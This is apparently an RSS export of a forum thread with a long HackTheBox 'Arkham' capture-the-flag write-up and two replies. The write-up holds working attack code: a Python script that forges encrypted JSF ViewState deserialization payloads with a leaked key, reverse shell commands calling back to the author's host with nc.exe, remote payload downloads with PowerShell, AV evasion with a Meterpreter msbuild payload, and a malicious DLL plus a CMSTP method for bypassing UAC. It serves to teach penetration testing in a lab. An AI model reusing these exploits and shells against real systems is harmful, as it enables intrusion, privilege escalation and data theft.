@@ -1,0 +1,1238 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>HackTheBox Writeup: Arkham</title>
+    <link>https://0x00sec.org/t/hackthebox-writeup-arkham/15541</link>
+    <description>![image|598x378](upload://2yvsodiEz4fdMX6se6loVKZsFWE.png) 
+Arkham is one of my favorite boxes on HTB and it just got retired, I personally wouldn&#39;t have rated it as Medium but maybe it&#39;s just because it&#39;s the hardest Windows box I have faced so far, and it proved to be a lot of fun and a good way to learn more about Windows internals and post exploitation. Keep in mind that this is going to be a rather long writeup as I like showing all the steps and the thought process behind them. That being said, let&#39;s start from the very beginning: enumeration.
+
+---
+**Drawing the perimeter**
+
+The usual basic nmap scan with service enumeration (-sV) and execution of default NSE scripts (-sC) on all ports (-p-) returns a few ports that may be of our interest:
+
+
+    ┌─[baud@parrot]─[~/arkham]
+    └──╼ $sudo nmap -sC -sV -p- -oA nmap 10.10.10.130
+    [sudo] password di baud:
+    Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-07 19:19 CEST
+    Nmap scan report for 10.10.10.130
+    Host is up (0.025s latency).
+    Not shown: 65528 filtered ports
+    PORT      STATE SERVICE       VERSION
+    80/tcp    open  http          Microsoft IIS httpd 10.0
+    | http-methods:
+    |_  Potentially risky methods: TRACE
+    |_http-server-header: Microsoft-IIS/10.0
+    |_http-title: IIS Windows Server
+    135/tcp   open  msrpc         Microsoft Windows RPC
+    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+    445/tcp   open  microsoft-ds?
+    8080/tcp  open  http          Apache Tomcat 8.5.37
+    | http-methods:
+    |_  Potentially risky methods: PUT DELETE
+    |_http-open-proxy: Proxy might be redirecting requests
+    |_http-title: Mask Inc.
+    49666/tcp open  msrpc         Microsoft Windows RPC
+    49667/tcp open  msrpc         Microsoft Windows RPC
+    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+    Host script results:
+    |_clock-skew: mean: -27s, deviation: 0s, median: -27s
+    | smb2-security-mode:
+    |   2.02:
+    |_    Message signing enabled but not required
+    | smb2-time:
+    |   date: 2019-08-07 19:21:44
+    |_  start_date: N/A
+
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 206.66 seconds
+
+First of all, from the version of IIS running on port 80 (IIS 10.0) we can already tell we are dealing with either Windows Server 2016 or Windows 10, and opening the address [http://10.10.10.130](http://10.10.10.130/) on a browser shows a default unalterated installation of IIS:
+
+![image|690x486](upload://e2i7cQsXNHIoavAPV76VmkNJD6f.png) 
+Running gobuster with a big dictionary doesn&#39;t return any results either so better focus somewhere else.
+
+    ┌─[✗]─[baud@parrot]─[~/arkham]
+    └──╼ $gobuster dir -w ../SecLists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.130
+    ===============================================================
+    Gobuster v3.0.1
+    by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+    ===============================================================
+    [+] Url:            http://10.10.10.130
+    [+] Threads:        50
+    [+] Wordlist:       ../SecLists/Discovery/Web-Content/big.txt
+    [+] Status codes:   200,204,301,302,307,401,403
+    [+] User Agent:     gobuster/3.0.1
+    [+] Timeout:        10s
+    ===============================================================
+    2019/08/08 17:12:31 Starting gobuster
+    ===============================================================
+    ===============================================================
+    2019/08/08 17:12:46 Finished
+    ===============================================================
+
+For example, there&#39;s a second web server running on port 8080, this time it&#39;s an Apache Tomcat server and there&#39;s an actual custom website:
+
+![image|690x487](upload://ezGLpcX02Y3jpaUy3oSnZb3WBRH.jpeg) 
+The website seems to be advertising a service called &quot;Masks&quot;, name which is actually a hint on the technology behind this web application, in fact the only functional button on the website is the &quot;Subscription&quot; button, which redirects to this URL:
+
+    http://10.10.10.130:8080/userSubscribe.faces
+
+The .faces extension tells us this page relies on the Java Server Faces framework (JFS), possibly the Apache MyFaces implementation since this is an Apache server. JFS is a framework used to design web-based user interfaces, and on this site it&#39;s used to handle this simple subscription form:
+
+![image|645x413](upload://sOSNG5WvnfsDsFObYhhf3TyeZHP.png) 
+The button generates a POST request to the same page, sending the server not only the address we provide, but also a hidden input field that was in the HTML code, called &quot;javax.faces.ViewState&quot;:
+
+![image|690x135](upload://snOwSq8pYECwWs6UdwMrzv4uHzE.png) 
+With a little [research](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html) I discover that ViewState is a variable used by JFS to determine what components are supposed to be displayed on the page, and it&#39;s actually a serialized Java object which when not configured correctly can lead to RCE vulnerabilities. Because some implementations of JSF didn&#39;t encrypt or sign this ViewState string it is possible for an attacker to craft a malicious serialized Java object to send in place of the original, this object can use the Java gadgets available to the application to execute code.
+
+Unfortunately for us, Apache MyFaces enables ViewState encryption by default using DES/ECB/PKCS5 Padding and even an SHA1 HMAC with a secret key to verify the validity of the data before it is decrypted server-side. If you&#39;re interested in knowing how all this works you&#39;ll find some Java pseudo-code later in this writeup or you can consult [the actual source code](https://www.programcreek.com/java-api-examples/?code=apache/myfaces-trinidad/myfaces-trinidad-master/trinidad-impl/src/main/java/org/apache/myfaces/trinidadinternal/util/StateUtils.java) responsible for encryption and decryption of the serialized object. Let&#39;s leave all this information on hold for some time and continue exploring the box.
+
+All gobuster can find on this second web server is a bunch of resource folders that we cannot list:
+
+    /css
+    /favicons
+    /fonts
+    /images
+    /js
+
+And excluding the two RPC ports I saved the most interesting one for last: SMB. Let&#39;s list the available shares using smbclient:
+
+![image|645x226](upload://dJ4icKyp7HFDOHyWw0aZAT5HoCf.png) 
+Despite it containing &quot;secrets&quot; the BatShare folder is accessible without authentication and it contains a .zip file:
+
+![image|690x176](upload://96UdJkL07MFbCZJ5g9EFuA40d7z.png) 
+
+    smb: \&gt; get appserver.zip
+    getting file \appserver.zip of size 4046695 as appserver.zip (1415,4 KiloBytes/sec) (average 1415,4 KiloBytes/sec)
+    smb: \&gt; exit
+    ┌─[baud@parrot]─[~]
+    └──╼ $file appserver.zip
+    appserver.zip: Zip archive data, at least v2.0 to extract
+    ┌─[baud@parrot]─[~]
+    └──╼ $mv appserver.zip arkham/
+    ┌─[baud@parrot]─[~]
+    └──╼ $cd arkham
+    ┌─[baud@parrot]─[~/arkham]
+    └──╼ $unzip appserver.zip
+    Archive:  appserver.zip
+      inflating: IMPORTANT.txt           
+      inflating: backup.img              
+
+The IMPORTANT.txt file contains a note for Alfred from Bruce, anticipating us that backup.img is password protected:
+
+    Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn&#39;t have unauthenticated access to it. - Bruce
+
+Now it&#39;s time for some trial and error. The easiest way to go past this obstacle is creating a subset of a big dictionary containing only Batman-related passwords to make our lives easier, I&#39;m going to use rockyou.txt:
+
+    $ cat /usr/share/wordlists/rockyou.txt | egrep &#39;batman|robin|alfred|joker|scarecrow|gotham&#39; &gt; wordlist.txt
+
+This command creates a new wordlist with all the entries in rockyou.txt that contain the specified Batman-related words. This returns less than 6000 passwords, much less than having to deal with the whole huge original dictionary:
+
+![image|459x85](upload://f4nWycnVKfiNrdzlF8sXAsZy84J.png) 
+Because these are still a lot of passwords it&#39;s necessary to automate the password guessing process. First let&#39;s check what kind of image file we are dealing with:
+
+![image|690x61](upload://hOCzHDfTTXbkkQSaNAt5DykLiF6.png) 
+Because it&#39;s a LUKS file we can use the cryptsetup utility to work with it, and it comes really handy that it supports an option to verify passwords:
+
+![image|690x139](upload://iaKX1vhzfj7pjLnAihjuU5wVmP6.png) 
+Thanks to this a simple bash script can be written to bruteforce the file:
+
+```bash
+# read a line from the wordlist
+cat wordlist.txt | while read i; do
+        echo -ne &quot;\rTrying: \&quot;$i\&quot;&quot;\\r
+        # pass the current password attempt to cryptsetup (the .img file is passed from stdin)
+        echo $i | cryptsetup luksOpen $1 x --test-passphrase -T1 2&gt;/dev/null
+        # grab cryptsetup&#39;s exit code
+        STATUS=$?
+        # was the operation successful?
+        if [ $STATUS -eq 0 ]; then
+                echo -e &quot;\nPASSWORD FOUND: \&quot;$i\&quot;&quot;
+                break
+        fi
+   done
+```
+
+The script is a little slow but it does the job and the password is found:
+
+    ┌─[root@parrot]─[/home/baud/arkham]
+    └──╼ #./luksBrute.sh backup.img
+    Trying: &quot;batman&quot;
+    Trying: &quot;alfredo&quot;
+    Trying: &quot;alfred&quot;
+    Trying: &quot;robinson&quot;
+    Trying: &quot;batman1&quot;
+    Trying: &quot;joker&quot;
+    Trying: &quot;robin&quot;
+    [....]
+    PASSWORD FOUND: &quot;batmanforever&quot;
+
+cryptsetup automatically mapped the image file on to /dev/mapper/x so it needs to be mounted:
+
+    ┌─[root@parrot]─[/home/baud/arkham]
+    └──╼ # mkdir /mnt/arkham
+    ┌─[root@parrot]─[/home/baud/arkham]
+    └──╼ # mount /dev/mapper/x /mnt/arkham
+    ┌─[root@parrot]─[/home/baud/arkham]
+    └──╼ # ls -la /mnt/arkham/
+    totale 14
+    drwxr-xr-x 4 root root  1024 dic 25  2018 .
+    drwxr-xr-x 1 root root    38 ago  7 19:23 ..
+    drwx------ 2 root root 12288 dic 25  2018 lost+found
+    drwxrwxr-x 4 root root  1024 dic 25  2018 Mask
+
+lost+found is empty but Mask contains MyFaces configuration files, other than a few random images which don&#39;t contain anything interesting and have nothing to hide:
+
+    ┌─[root@parrot]─[/mnt/arkham]
+    └──╼ #ls -ls Mask
+    totale 880
+      1 drwxr-xr-x 2 root root   1024 dic 25  2018 docs
+    95 -rw-rw-r-- 1 root root  96978 dic 25  2018 joker.png
+    103 -rw-rw-r-- 1 root root 105374 dic 25  2018 me.jpg
+    672 -rw-rw-r-- 1 root root 687160 dic 25  2018 mycar.jpg
+      8 -rw-rw-r-- 1 root root   7586 dic 25  2018 robin.jpeg
+      1 drwxr-xr-x 2 root root   1024 dic 25  2018 tomcat-stuff
+    ┌─[root@parrot]─[/mnt/arkham]
+    └──╼ #ls -la Mask/tomcat-stuff
+    totale 193
+    drwxr-xr-x 2 root root   1024 dic 25  2018 .
+    drwxrwxr-x 4 root root   1024 dic 25  2018 ..
+    -rw-r--r-- 1 root root   1368 dic 25  2018 context.xml
+    -rw-r--r-- 1 root root    832 dic 25  2018 faces-config.xml
+    -rw-r--r-- 1 root root   1172 dic 25  2018 jaspic-providers.xml
+    -rw-r--r-- 1 root root     39 dic 25  2018 MANIFEST.MF
+    -rw-r--r-- 1 root root   7678 dic 25  2018 server.xml
+    -rw-r--r-- 1 root root   2208 dic 25  2018 tomcat-users.xml
+    -rw-r--r-- 1 root root 174021 dic 25  2018 web.xml
+    -rw-r--r-- 1 root root   3498 dic 25  2018 web.xml.bak
+
+If you&#39;re wondering, docs contains the scripts of Batman Begins. Confused? So am I. But here&#39;s something very interesting to break the confusion, by taking a look at the configuration files I discover the encryption settings used by the server:
+
+![image|690x451](upload://lQSo8YjQ3sEStnnLDPnlGIpx8pq.png) 
+Now that I know the secret keys used by the web application to encrypt and decrypt the ViewState object I can send my own malicious objects to achieve RCE.
+
+---
+**A bit of cryptography**
+
+I took a look at the MyFaces code to see how it works out of curiosity and altered it a bit to get rid of stuff I don&#39;t need and to make it more readable, this is the function responsible for encrypting objects:
+
+```java
+public static byte[] encrypt(byte[] insecure, ExternalContext ctx)
+{
+    // no IV by default
+    byte[] iv = null;
+    // create the mac object
+    Mac mac = Mac.getInstance(&quot;HmacSHA1&quot;);
+    // give it the secret key
+    mac.init(&quot;SnNGOTg3Ni0=&quot;);
+    // declare the output cihper
+    Cipher cipher = Cipher.getInstance(&quot;DES/ECB/PKCS5Padding&quot;);
+    // initialize it with the secret key
+    cipher.init(Cipher.ENCRYPT_MODE, &quot;SnNGOTg3Ni0=&quot;);
+    // SHA1 output = 20 bytes
+    int macLenght = mac.getMacLength();
+    // this array of bytes will contain the encrypted data. The mac is appeneded to it
+    byte[] secure = new byte[cipher.getOutputSize(insecure.length) + macLenght];
+    // encrypt data &quot;insecure&quot; and store the cipher in &quot;secure&quot;
+    int secureCount = cipher.doFinal(insecure, 0, insecure.length, secure);
+    // update the mac with the current params: source buffer, offset, amount of bytes
+    mac.update(secure, 0, secureCount);
+    // and then calculate it
+    mac.doFinal(secure, secureCount);
+    return secure;
+}
+```
+
+And this one decrypts them:
+
+```java
+public static byte[] decrypt(byte[] secure, ExternalContext ctx)
+{
+    // no IV by default
+    byte[] iv = null;
+    // create the mac object
+    Mac mac = Mac.getInstance(&quot;HmacSHA1&quot;);
+    // give the object the secret key
+    mac.init(&quot;SnNGOTg3Ni0=&quot;);
+    // create a DES cipher for the decryption process
+    Cipher cipher = Cipher.getInstance(&quot;DES/ECB/PKCS5Padding&quot;);
+    // initialize the cipher for decryption with the secret key
+    cipher.init(Cipher.DECRYPT_MODE, &quot;SnNGOTg3Ni0=&quot;);
+    // SHA1 output = 20 bytes
+    int macLenght = mac.getMacLength();
+    // calculate the mac from the received data
+    mac.update(secure, 0, secure.length-macLenght);
+    byte[] signedDigestHash = mac.doFinal();
+    boolean isMacEqual = true;
+    // check if the received mac has been calculated with the correct key
+    for (int i = 0; i &lt; signedDigestHash.length; i++)
+    {
+        if (signedDigestHash[i] != secure[secure.length-macLenght+i])
+        {
+            isMacEqual = false;
+        }
+    }
+    // if the two macs are equal the object is decrypted
+    return cipher.doFinal(secure, 0, secure.length-macLenght);
+}
+```
+
+The way it works is the serialized Java object is made of DES encrypted data with the HMAC used for verification appended at the end, it being the last 20 bytes. This structure is then encoded in Base64 and it&#39;s what we saw earlier on Burp. The HMAC is used to calculate a message digest using the encrypted data and the secret key, when the server receives the ViewState object back it will first calculate a new HMAC from the data it received and the key stored in the settings, if it&#39;s the same as the HMAC appended to the data then the data can be trusted and it is finally deserialized. Now that we have that secret key we can use it to calculate our own valid HMACs, allowing us to achieve RCE because our objects will look 100% legit.
+
+---
+&lt;a name=&quot;exploitation&quot;&gt;&lt;/a&gt;
+**Exploitation: blind shell**
+
+By exploiting this flaw we&#39;ll be able to execute arbitrary Java gadgets that when chained together can perform several tasks, but because we&#39;re not executing OS commands from the start we need a third party program to generate these chains for us and serialize them, for this purpose I downloaded [ysoserial](https://github.com/frohoff/ysoserial) and used the CommonsCollections5 gadgets to execute cmd.exe on the system. ysoserial returns the serialized object on stdout so we can write a Python script that grabs the output from ysoserial and forwards it to the server after encrypting it properly and appending the correct HMAC to it:
+
+```
+import base64
+import hashlib
+import urllib
+import hmac
+import pyDes
+import sys
+import requests
+import subprocess
+
+# generate the serialized Java object
+def getPayload(cmd):
+    p = subprocess.Popen(&#39;java -jar /home/baud/arkham/ysoserial.jar CommonsCollections5 &quot;&#39;+cmd+&#39;&quot;&#39;, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
+    payload = p.stdout.read()
+
+    # encrypt the object with DES
+    secret = bytes(base64.b64decode(&quot;SnNGOTg3Ni0=&quot;))
+    des_obj = pyDes.des(secret, pyDes.ECB, IV=None, padmode=pyDes.PAD_PKCS5)
+    encrypted_payload = des_obj.encrypt(payload)
+
+    # calculate the HMAC
+    mac_obj = hmac.new(secret, encrypted_payload, hashlib.sha1)
+    mac = mac_obj.digest()
+
+    # return [encrypted_data + HMAC]
+    out = base64.encodestring(encrypted_payload + mac)
+    out = out.replace(&#39;\n&#39;, &#39;&#39;).replace(&#39;\r&#39;, &#39;&#39;)
+    return out
+
+# ask for the command to be executed
+while True:
+    cmd = raw_input(&quot;&gt; &quot;)
+    if cmd == &#39;exit&#39;:
+        sys.exit(0)
+
+    # send a POST request to the server with our newly crafted ViewState object
+    url = &quot;http://10.10.10.130:8080/userSubscribe.faces&quot;
+    cookies = {&quot;JSESSIONID&quot;: &quot;38D5C0F7EAC7A6F06299275C268986BB&quot;}
+    req_headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36&quot;}
+    req_data={&quot;j_id_jsp_1623871077_1:email&quot;: &quot;baudy@baud.com&quot;, &quot;j_id_jsp_1623871077_1:submit&quot;: &quot;SIGN UP&quot;, &quot;j_id_jsp_1623871077_1_SUBMIT&quot;: &quot;1&quot;}
+    data[&#39;javax.faces.ViewState&#39;] = getPayload(cmd)
+    r = requests.post(url, cookies=cookies, data=req_data, headers=req_headers)
+```
+
+This script gives us a blind shell on the box, we are able to execute any operation we want but it&#39;s still uncomfortable, and blind, so to have a proper shell I downloaded nc.exe on the box using Invoke-WebReques after starting an HTTP server with PHP and opening a listener to welcome the incoming connection:
+
+
+    ┌─[root@parrot]─[/home/baud/server]
+    └──╼ # php -S 0.0.0.0:9090 -t .
+    ┌─[root@parrot]─[/home/baud/arkham]
+    └──╼ # nc -lvnp 9999
+And from the blind shell :
+
+    &gt; powershell iwr http://10.10.14.29:9090/nc.exe -OutFile ./nc.exe
+    &gt; nc.exe -e cmd 10.10.14.29 9999
+
+![image|690x360](upload://uw62FZSOW8goyVlArTHIx3f3YwC.png) 
+With this we finally have a shell as Alfred and can read our first flag, then it&#39;s time for some local enumeration. Aside from Alfred and Administrator there&#39;s another user on the system: Batman. Unfortunately his directory is out of our reach.
+
+![image|503x254](upload://zKD0DgK4EX18YrgOYDJqqjGEkxo.png) 
+**Horizontal privilege escalation**
+
+Inside Alfred&#39;s downloads directory there&#39;s a backups folder containing a backup.zip file, because I&#39;m lazy and meterpreter executables are immediately detected by an angry Defender I&#39;m going to use nc.exe to transfer this file locally:
+
+    # On Arkham:
+    nc.exe 10.10.14.29 4444 &lt; c:\users\alfred\downloads\backups\backup.zip
+    # On local box:
+    nc -lvp 4444 &gt; backup.zip
+
+![image|578x405](upload://dkmLM5PgNc3s7BgeCVg1oC5J5u3.png) 
+After unzipping the file it turns out the content is a .ost file, so an Outlook mail archive, so to say. On Linux we can open it using readpst and it will extract the emails it finds:
+
+![image|615x391](upload://xsWnekMqKfJoZZ2LcjbASBLE1b8.png) 
+The only email it found was in the Drafts folder and we can read it by catting the Drafts file created by readpst. The mail contains an image as attachment which is encoded in Base64 and the body of the message tells us this email was supposed to be sent to Master Wayne because he keeps forgetting his password:
+
+![image|690x312](upload://8fGHjPZjSG60pZRYxR2TtQlFF7o.png) 
+Convert the attachment back to .png and the result is this:
+
+![image|656x330](upload://w309sPgVlWE88C5R0GAXrZWOmJL.png) 
+Not only this picture gives us the Batman account&#39;s password, it also gives us a big hint on one of the two ways we have to get root. So now we have a new pair of credentials:
+
+    User: batman
+    Pass: Zx^#QZX+T!123
+
+There are no services such as RDP or SSH running on the box so we cannot log in as Batman from the outside, but we can do it through a [PSSession](https://www.sconstantinou.com/windows-powershell-sessions-pssessions/):
+
+```powershell
+$pw = ConvertTo-SecureString -string &quot;Zx^#QZX+T!123&quot; -AsPlainText -force;
+$pp = new-object -typename System.Management.Automation.PSCredential -ArgumentList &quot;ARKHAM\batman&quot;, $pw;
+Enter-PSSession -ComputerName localhost -Credential $pp
+```
+
+![image|690x188](upload://yorYalDBP4o67N3ReAKx6ChS0M7.png) 
+Once in the PSSession we must follow the following syntax in order to run cmd commands:
+
+    Invoke-Command -ScriptBlock { command }
+
+This is very tedious to write every time so we can bypass this obstacle by using the nc.exe executable we uploaded earlier to start a normal cmd shell on another port:
+
+    Invoke-Command -ScriptBlock {C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.29 9797 -e cmd.exe}
+
+![image|588x199](upload://mej3YAHktXIVii1IjzCRLYyDBYa.png) 
+Now we can start investigating the system further. Batman&#39;s home folder doesn&#39;t contain anything so what&#39;s the purpose in using this account? Well, apparently Batman is actually part of the Administrators group:
+
+![image|690x284](upload://c2ZQZs136Qj0on0itWrcoqrQgdZ.png) 
+But trying to access the Administrator folder still results in an access denied error:
+
+![image|414x88](upload://gEmhKYSMACdoKoF3cmgMKmubvn5.png) 
+This is because UAC is enabled and doesn&#39;t allow us to use Administrator privileges, we&#39;d need to be in an interactive desktop and click &quot;Yes&quot; on the UAC prompt in order to execute commands that require Administrator permissions.
+
+---
+**Getting root - the easy way (net use)**
+
+I said that the attachment picture is a clear hint of a way to grab the root flag because we can use the same utility shown in Alfred&#39;s screenshot to access it. Because we are already administrators with this account we can use net use and mount the administrator&#39;s folder (or the whole drive) on to another drive and we&#39;ll be able to access it without UAC getting in the way:
+
+    $ net use * &quot;\\arkham\users\administrator\desktop&quot; /persistent:no
+
+![image|690x274](upload://feW0DRLVvZJv6Ad0zkcIdhomNCa.png) 
+
+---
+**Getting root - the real men&#39;s way (UAC bypass)**
+
+There are a few currently unpathced UAC bypasses for Windows 10, I tried these two: 
+
+1) https://egre55.github.io/system-properties-uac-bypass/
+2) https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
+
+And I&#39;m going to demonstrate egre55&#39;s method because in my opinion it&#39;s more fun, even if a little longer. This method abuses the fact that some executables can bypass the UAC prompt thanks to a property found inside the executable&#39;s manifest: &quot;*autoElevate*&quot;. If set to &quot;true&quot; this allows certain programs to be granted a token of higher integrity without going through the UAC prompt, while other processes stay with a medium integrity security token preventing them from performing any operations where administrator privileges are required. Egre55 found that some of the programs with this property are vulnerable to DLL hijacking and crafting a malicious DLL allows us to execute arbitrary code bypassing UAC. These are the vulnerable programs:
+
+    C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+    C:\Windows\SysWOW64\SystemPropertiesComputerName.exe
+    C:\Windows\SysWOW64\SystemPropertiesHardware.exe
+    C:\Windows\SysWOW64\SystemPropertiesProtection.exe
+    C:\Windows\SysWOW64\SystemPropertiesRemote.exe
+
+They all try to load a library called srrstr.dll from AppData/Local/Microsoft/WindowsApps/, folder which is present in the PATH environment variable and can be written to by normal users:
+
+![image|690x76](upload://4N7lyG4aZD175rKEH69peYT6RgJ.png) 
+If we drop a malicious srrstr.dll file in that folder and start one of those programs our code will be executed with elevated privileges. Before we do that we must make sure our shell is in an interactive process, otherwise it won&#39;t work. To do this we need a Meterpreter shell but because Defender will find and delete all default Meterpreter payloads there&#39;s also a bit of AV evasion involved that I&#39;ll solve with [GreatSCT](https://github.com/GreatSCT/GreatSCT). To be more specific I&#39;ll be launching Meterpreter via the msbuild method, read more about it [here](https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/). Other useful AV evasion solutions that could work in this instance are [Veil](https://github.com/Veil-Framework/Veil), [Phantom Evasion](https://github.com/oddcod3/Phantom-Evasion), [Ebowla](https://github.com/Genetic-Malware/Ebowla) and [nps_payload](https://github.com/trustedsec/nps_payload).
+
+These are the steps to generate the payload using GreatSCT:
+
+    &gt; use Bypass
+    &gt; use msbuild/meterpreter/rev_tcp.py
+    &gt; set LHOST 10.10.14.29
+    &gt; set LPORT 9292
+    &gt; generate
+
+GreatSCT will create two different files for us:
+
+![image|582x206](upload://3XxSD3MatZyKMC4vIVtVR1Igr8v.png) 
+payload.xml will be msbuild&#39;s input, while payload.rc is a Metasploit resource file to be opened by msfconsole either with the -r flag or the resource command, and will start a multi handler for us. So let&#39;s download the xml file on Arkham (again with Invoke-WebRequest or &quot;iwk&quot; for short) and then launch msbuild.exe by specifing its absolute path since it&#39;s not in %path%:
+
+    C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe msbuild.xml
+
+![image|690x122](upload://iheLe38FCYJdFpZo6lUsw18prOs.png) 
+The handler in the meantime catches the incoming connection and starts a Meterpreter session:
+
+![image|690x285](upload://wyDZKuBU7Q1z1LKWE0FioBLxxol.png) 
+Now we can list running processes with ps and select an interactive one (so one with a GUI) to migrate to, explorer.exe is a good example:
+
+![image|690x120](upload://4FW6q8mgfDW8d8Zif2YOUFIWuIL.png) 
+Now it&#39;s time to craft a DLL. Mine will just start a reverse shell with the same nc.exe we&#39;ve been using over and over again, here&#39;s the C++ code:
+
+```c++
+#include &lt;windows.h&gt;
+
+void exploit(void);
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
+{
+    switch (dwReason)
+    {
+        case DLL_PROCESS_ATTACH:
+            exploit();
+    }
+    return TRUE;
+}
+
+void exploit(void)
+{
+    PROCESS_INFORMATION pi;
+    STARTUPINFO si;
+    ZeroMemory(&amp;si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&amp;pi, sizeof(pi));
+    char cmd[] = &quot;C:\\tomcat\\apache-tomcat-8.5.37\\bin\\nc.exe -e cmd 10.10.14.29 5555&quot;;
+    
+    CreateProcess(NULL, // No module name (use command line)
+        cmd,            // Command line
+        NULL,           // Process handle not inheritable
+        NULL,           // Thread handle not inheritable
+        FALSE,          // Set handle inheritance to FALSE
+        0,              // No creation flags
+        NULL,           // Use parent&#39;s environment block
+        NULL,           // Use parent&#39;s starting directory
+        &amp;si,            // Pointer to STARTUPINFO structure
+        &amp;pi );          // Pointer to PROCESS_INFORMATION structure
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    ExitThread(0);
+}
+```
+If you&#39;re interested in knowing more about how it works I suggest reading these two pages: [DllMain](https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain), [CreateProcessA](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa). I compiled it using mingw32:
+
+    ┌─[baud@parrot]─[~/arkham]
+    └──╼ $i686-w64-mingw32-gcc -shared -o srrstr.dll srrstr.cpp -l ws2_32
+
+Note: if anyone knows why only the code compiled with i686-w64-mingw32-gcc works on the box and not with x86_64-w64-mingw32-gcc please let me know, because I&#39;m a little confused.  Anyway, drop the DLL in the WindowsApps folder, launch one of the vulnerable programs, and a shell is spawned:
+
+![image|690x215](upload://7ujNVJeWDclbKkmCeFqWHlzEIUe.png) 
+![image|550x264](upload://9BDKXOnnfgs9FSM8oLUAVJ2VwFh.png) 
+Note that the full path of the program must be specified, this is necessary because there are two different copies of the program on the disk, one in System32 and the other in SysWOW64, apparently the attack only works with the second executable.
+
+The second UAC bypass is easy to pull off as well, it consinsts in downloading a [C# source file](https://github.com/0xVIC/UAC/blob/master/SendKeys_technique.cs), compiling it as a DLL on Arkham, loading the DLL into memory from PS, and calling the bypass function from the DLL by giving it a command to run which will inherit higher privileges. [Here](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/) is explained the bypass that the DLL exploits, which relies on a binary called CMSTP.exe:
+
+```powershell
+# download the file locally:
+Invoke-WebRequest &quot;http://10.10.14.29:9090/bypass.cs&quot; -outfile &quot;./Source.cs&quot;
+# compile it as a DLL:
+Add-Type -TypeDefinition ([IO.File]::ReadAllText(&quot;$pwd\Source.cs&quot;)) -ReferencedAssemblies &quot;System.Windows.Forms&quot; -OutputAssembly &quot;CMSTP-UAC-Bypass.dll&quot;
+# load the newly compiled DLL into memory:
+[Reflection.Assembly]::Load([IO.File]::ReadAllBytes(&quot;$pwd\CMSTP-UAC-Bypass.dll&quot;))
+# get a reverse shell using nc:
+[CMSTPBypass]::Execute(&quot;C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.29 9898 -e cmd.exe&quot;)
+```
+[(source)](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html)
+
+This was Arkham, one of the most fun and instructive boxes I&#39;ve done so far. Thank you for reading, I hope you found this post useful.</description>
+    
+    <lastBuildDate>Tue, 13 Aug 2019 07:48:10 +0000</lastBuildDate>
+    <category>Hackthebox Writeups</category>
+    <atom:link href="https://0x00sec.org/t/hackthebox-writeup-arkham/15541.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>HackTheBox Writeup: Arkham</title>
+        <dc:creator><![CDATA[hacker_snail]]></dc:creator>
+        <description><![CDATA[
+            <p>Wow, this is a very good write up, good job!</p>
+          <p><a href="https://0x00sec.org/t/hackthebox-writeup-arkham/15541/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/hackthebox-writeup-arkham/15541/4</link>
+        <pubDate>Tue, 13 Aug 2019 07:48:10 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15541-4</guid>
+        <source url="https://0x00sec.org/t/hackthebox-writeup-arkham/15541.rss">HackTheBox Writeup: Arkham</source>
+      </item>
+      <item>
+        <title>HackTheBox Writeup: Arkham</title>
+        <dc:creator><![CDATA[petruknisme]]></dc:creator>
+        <description><![CDATA[
+            <p>We can extract img file without bruteforce as far as I know. This is what I did:</p>
+<pre><code class="lang-auto">↳ binwalk -e backup.img 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+519168        0x7EC00         Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995
+544768        0x85000         Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995
+551936        0x86C00         Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995
+8388608       0x800000        Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995
+8542755       0x825A23        Zip archive data, at least v1.0 to extract, name: Mask/tomcat-stuff/
+8542831       0x825A6F        Zip archive data, at least v2.0 to extract, compressed size: 1006, uncompressed size: 2208, name: Mask/tomcat-stuff/tomcat-users.xml
+8543929       0x825EB9        Zip archive data, at least v2.0 to extract, compressed size: 1151, uncompressed size: 3498, name: Mask/tomcat-stuff/web.xml.bak
+8545167       0x82638F        Zip archive data, at least v2.0 to extract, compressed size: 709, uncompressed size: 1368, name: Mask/tomcat-stuff/context.xml
